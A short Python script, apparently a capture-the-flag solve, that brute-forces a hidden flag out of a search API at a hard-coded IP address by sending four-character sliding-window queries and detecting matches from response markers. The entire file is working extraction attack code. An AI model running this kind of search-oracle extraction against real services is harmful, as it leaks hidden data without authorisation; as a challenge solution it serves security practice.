import string, requests, time

URL = "http://5.223.66.228:57986/api/search"
FLAG_PREFIX = "3108{B"                     # start from what you already know
CHARSET = string.ascii_letters + string.digits + "_-{}"
SLEEP = 0.12                               # gentle pacing

def hit(q: str) -> bool:
    r = requests.post(URL, json={"query": q}, timeout=8)
    # Try JSON first (if the API returns JSON)
    try:
        data = r.json()
        results = data.get("results", data.get("posts", [])) or []
        for post in results:
            title = (post.get("title") or "").lower()
            content = (post.get("content") or "").lower()
            if ("ada rahsia di sini" in content) or ("flag" in content) or ("petunjuk" in title):
                return True
    except Exception:
        pass
    # Fallback to text marker you observed
    return "Well luckily the content of the flag is hidden so here it is:" in r.text

def window4(known: str, c: str) -> str:
    # Use the last 3 known chars + candidate to form a 4-char query
    core = (known[-3:] if len(known) >= 3 else known)
    w = core + c
    return w[-4:] if len(w) > 4 else w.rjust(4, FLAG_PREFIX[0]) if len(w) < 4 else w

def main():
    known = FLAG_PREFIX
    print(f"[start] prefix = {known}")

    while not known.endswith("}"):
        progressed = False
        for c in CHARSET:
            q = window4(known, c)
            if len(q) == 4 and hit(q):
                pos = len(known) + 1
                known += c
                print(f"[pos {pos}] → {c}   (query: {q})")
                progressed = True
                break
            time.sleep(SLEEP)

        if not progressed:
            print("[stop] no match this round.")
            break

    print(f"\n[flag] {known}")

if __name__ == "__main__":
    main()
